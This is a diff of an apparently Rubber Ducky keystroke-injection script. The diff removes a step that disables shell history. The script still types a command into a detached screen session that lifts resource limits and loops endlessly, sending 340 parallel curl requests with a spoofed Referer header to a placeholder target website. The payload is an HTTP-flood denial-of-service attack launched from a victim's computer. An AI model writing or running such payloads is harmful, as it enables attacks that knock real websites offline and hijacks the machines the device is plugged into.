@@ -12,10 +12,6 @@ STRING screen -dm bash -c
 DELAY 500
 ENTER
 DELAY 1000
-STRING unset HISTFILE
-DELAY 500
-ENTER
-DELAY 1000
 STRING ulimit -t unlimited; ulimit -f unlimited; ulimit -m unlimited; ulimit -u unlimited; ulimit -n 10000000000; ulimit -s unlimited; ulimit -v unlimited; while (true); do seq 1 340 | xargs -n1 -P 340 curl -s -H "Connection: keep-alive" -H "Referer: https://google.com" "https://Your.Target.Website.com" > /dev/null; done;
 DELAY 500
 ENTER
